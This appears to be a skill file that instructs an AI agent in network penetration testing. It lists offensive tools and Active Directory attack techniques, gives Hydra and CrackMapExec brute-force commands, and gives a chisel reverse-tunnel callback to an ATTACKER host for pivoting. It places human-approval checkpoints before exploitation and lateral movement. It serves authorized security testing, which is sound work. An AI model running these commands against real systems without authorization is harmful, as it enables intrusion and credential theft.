---
name: network-testing
description: >-
  Use this skill for network-level penetration testing. Covers service
  exploitation, protocol attacks, pivoting, lateral movement, and network
  infrastructure assessment. Includes tools like Metasploit, Hydra,
  CrackMapExec, and Responder. Activate when testing network services,
  internal networks, or infrastructure components.
---

# Network Penetration Testing

Network-layer security assessment and exploitation.

## Tools & Techniques

| Tool | Purpose |
|------|--------|
| `metasploit` | Exploitation framework |
| `hydra` | Credential brute-forcing |
| `crackmapexec` / `netexec` | Network service exploitation |
| `responder` | LLMNR/NBT-NS poisoning |
| `impacket` | Windows protocol tools |
| `chisel` | TCP/UDP tunneling |
| `proxychains` | Traffic proxying |
| `evil-winrm` | WinRM shell |
| `bloodhound` | AD attack path mapping |
| `kerbrute` | Kerberos user enumeration |
| `smbclient` | SMB interaction |
| `rpcclient` | RPC enumeration |
| `john` / `hashcat` | Password cracking |

## Testing Areas

### Service Exploitation
- FTP (anonymous access, known CVEs)
- SSH (weak credentials, key reuse)
- SMB (EternalBlue, null sessions, shares)
- RDP (BlueKeep, credential spraying)
- DNS (zone transfers, cache poisoning)
- SMTP (open relay, user enumeration)
- SNMP (community strings, info leak)
- Database services (MySQL, MSSQL, PostgreSQL, Redis, MongoDB)

### Windows / Active Directory
- Kerberoasting
- AS-REP roasting
- Pass-the-Hash / Pass-the-Ticket
- DCSync
- GPP password extraction
- NTLM relay
- BloodHound attack path analysis

### Credential Attacks
```bash
# Hydra brute-force
hydra -L users.txt -P passwords.txt TARGET ssh
hydra -l admin -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# CrackMapExec
crackmapexec smb TARGET -u users.txt -p passwords.txt
crackmapexec winrm TARGET -u user -p pass
```

### Pivoting & Lateral Movement
```bash
# Chisel tunneling
chisel server -p 8080 --reverse     # Attacker
chisel client ATTACKER:8080 R:socks  # Target

# Proxychains
proxychains nmap -sT -Pn TARGET
```

## Procedure

1. **Service Identification**: Map all network services from recon phase
2. **Vulnerability Matching**: Cross-reference service versions with CVEs
3. **Credential Testing**: Test for default/weak credentials
4. **Exploitation**: Attempt exploitation (⚠️ HITL REQUIRED)
5. **Post-Exploitation**: Enumerate internal network if access gained
6. **Lateral Movement**: Pivot to additional systems (⚠️ HITL REQUIRED)
7. **Privilege Escalation**: Attempt to escalate privileges

## ⚠️ HITL Checkpoints
- Before ANY exploitation attempt
- Before credential brute-forcing
- Before lateral movement
- Before privilege escalation
